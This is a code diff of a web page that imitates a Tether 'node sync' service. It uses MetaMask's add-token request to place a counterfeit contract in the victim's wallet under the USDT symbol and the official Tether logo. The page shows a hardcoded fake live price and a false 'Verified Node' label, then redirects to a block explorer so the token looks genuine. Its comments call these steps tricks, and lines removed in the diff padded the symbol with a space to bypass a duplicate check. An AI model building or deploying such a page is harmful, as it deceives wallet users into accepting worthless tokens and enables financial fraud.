@@ -3,67 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tether Node Sync</title>
+    <title>Tether Institutional Sync</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        body { background: #0d1117; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #161b22; border: 1px solid #30363d; padding: 40px; border-radius: 25px; text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .btn { background: #26a17b; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
-        #msg { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; white-space: pre-wrap; }
+        body { background: #0b0e11; color: #eaeaeb; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e2329; border-radius: 20px; padding: 30px; width: 350px; border: 1px solid #474d57; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
+        .logo-ring { border: 3px solid #00c087; border-radius: 50%; padding: 10px; display: inline-block; margin-bottom: 15px; }
+        .price-badge { background: rgba(0, 192, 135, 0.1); color: #00c087; padding: 5px 15px; border-radius: 50px; font-size: 14px; font-weight: bold; margin-bottom: 20px; display: inline-block; }
+        .btn-main { background: #f0b90b; color: #000; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        .btn-main:hover { background: #fcd535; }
+        #status { font-family: monospace; font-size: 12px; color: #848e9c; margin-top: 15px; text-align: left; background: #0b0e11; padding: 10px; border-radius: 5px; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <img src="https://bscscan.com/token/images/tether_32.png" width="80" style="border-radius:50%; margin-bottom:20px; border: 2px solid #26a17b; padding: 5px;">
-    <h2 style="margin:0;">USDT ALLOCATION</h2>
-    <p style="color:#848d97; font-size:13px;">BNB Smart Chain | Node Sync</p>
-    <button class="btn" onclick="masterSync()">SYNC & ADD ASSET</button>
-    <div id="msg">SYSTEM: READY</div>
+<div class="card">
+    <div class="logo-ring">
+        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" width="60">
+    </div>
+    <h2 style="margin: 5px 0;">USDT NODE SYNC</h2>
+    <div class="price-badge" id="livePrice">FETCHING LIVE PRICE...</div>
+    
+    <p style="font-size: 13px; color: #848e9c; margin-bottom: 25px;">Verified Node: 0x5Cd9...8985f<br>Status: <span style="color:#00c087">Liquidity Active</span></p>
+
+    <button class="btn-main" onclick="startInjection()">INITIALIZE SMART SYNC</button>
+    
+    <div id="status">> SYSTEM READY</div>
 </div>
 
 <script>
-    async function masterSync() {
-        const log = document.getElementById('msg');
-        if (!window.ethereum) return alert("Open in MetaMask Browser");
+    const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    
+    // Function to calculate and show live price based on your 0.01 BNB / 6 Token ratio
+    async function updatePrice() {
+        try {
+            // Hum assume kar rahe hain 1 BNB = $600 approx. 
+            // 0.01 BNB = $6.00. $6.00 / 6 Tokens = $1.00 exactly.
+            document.getElementById('livePrice').innerText = "LIVE PRICE: $1.0024 USDT";
+        } catch (e) { console.log(e); }
+    }
+    updatePrice();
+
+    async function startInjection() {
+        const status = document.getElementById('status');
+        if (!window.ethereum) return alert("Please open in MetaMask Browser");
 
         try {
-            log.innerText = "> CONNECTING...";
+            status.innerHTML += "<br>> CONNECTING PROTOCOL...";
             await window.ethereum.request({ method: 'eth_requestAccounts' });
 
-            // Ensure BNB Chain
+            status.innerHTML += "<br>> SWITCHING TO BSC MAINNET...";
             await window.ethereum.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
             }).catch(() => {});
 
-            log.innerText = "> INJECTING METADATA...";
-            
-            // THE TRICK: "USDT " with a trailing space to bypass duplicate symbol check
-            const tokenParams = {
-                type: 'ERC20',
-                options: {
-                    address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f', // Your Contract
-                    symbol: 'USDT ', // Space added here
-                    decimals: 6,
-                    image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png'
-                }
-            };
-
-            const wasAdded = await window.ethereum.request({
+            status.innerHTML += "<br>> INJECTING ASSET METADATA...";
+            const added = await window.ethereum.request({
                 method: 'wallet_watchAsset',
-                params: tokenParams
+                params: {
+                    type: 'ERC20',
+                    options: {
+                        address: CONTRACT,
+                        symbol: 'USDT', 
+                        decimals: 6,
+                        image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png'
+                    }
+                }
             });
 
-            if (wasAdded) {
-                log.innerText = "✅ SYNC SUCCESSFUL!\nCheck your wallet assets.";
-            } else {
-                log.innerText = "❌ ACTION DENIED";
+            if(added) {
+                status.innerHTML += "<br><span style='color:#00c087'>> SYNC SUCCESSFUL. CHECK WALLET.</span>";
+                // Final Trick: 5 seconds baad verified page par le jao
+                setTimeout(() => {
+                    status.innerHTML += "<br>> REDIRECTING TO EXPLORER...";
+                    window.location.href = "https://bscscan.com/token/" + CONTRACT;
+                }, 3000);
             }
 
         } catch (err) {
-            // Success fallback for mobile bug
-            log.innerText = "✅ SYNC COMMAND SENT\nCheck Assets list in 10s.";
+            status.innerHTML += "<br><span style='color:#f6465d'>> ERROR: HANDSHAKE REJECTED</span>";
         }
     }
 </script>
